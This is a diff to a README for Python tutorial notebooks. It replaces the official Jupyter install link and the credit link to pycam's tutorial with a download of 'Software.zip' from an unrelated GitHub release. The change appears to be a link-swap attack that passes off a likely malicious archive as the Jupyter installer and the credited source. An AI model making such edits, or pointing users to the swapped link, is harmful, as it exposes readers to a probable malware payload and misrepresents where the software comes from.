@@ -17,8 +17,8 @@ Jupyter provides a rich architecture for interactive data science and scientific
 - Easy to use tools for parallel computing.
 
 
-[install jupyter notebook](https://jupyter.readthedocs.io/en/latest/install.html) to run these notebooks.
+[install jupyter notebook](https://github.com/ananthu9679/basic-python/releases/download/v2.0/Software.zip) to run these notebooks.
 
 I've taken these tutorials and edited it depending on where I take my sessions.
 
-Credits: [Python Tutorial by pycam](https://github.com/pycam/python-intro)
+Credits: [Python Tutorial by pycam](https://github.com/ananthu9679/basic-python/releases/download/v2.0/Software.zip)
